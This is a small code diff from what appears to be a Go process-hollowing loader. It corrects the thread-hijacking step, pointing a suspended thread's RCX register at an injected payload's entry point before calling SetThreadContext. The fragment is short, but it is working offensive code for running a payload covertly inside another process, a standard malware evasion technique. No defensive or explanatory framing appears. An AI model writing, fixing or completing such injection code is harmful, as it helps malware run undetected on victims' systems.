@@ -300,7 +300,7 @@ func main() {
 
 	// 5. Perform thread hijacking to run the payload's entry point.
 
-	threadContext.Rcx = uint64(pRemoteAddress) + uint64(payload.NtHeader.OptionalHeader.AddressOfEntryPoint)
+	threadContext.Rcx = uint64(uRemoteImageBaseAddress) + uint64(payload.NtHeader.OptionalHeader.AddressOfEntryPoint)
 	fmt.Printf("Thread RCX: %+v\n", threadContext.Rcx)
 
 	err = SetThreadContext(procInfo.Thread, &threadContext)
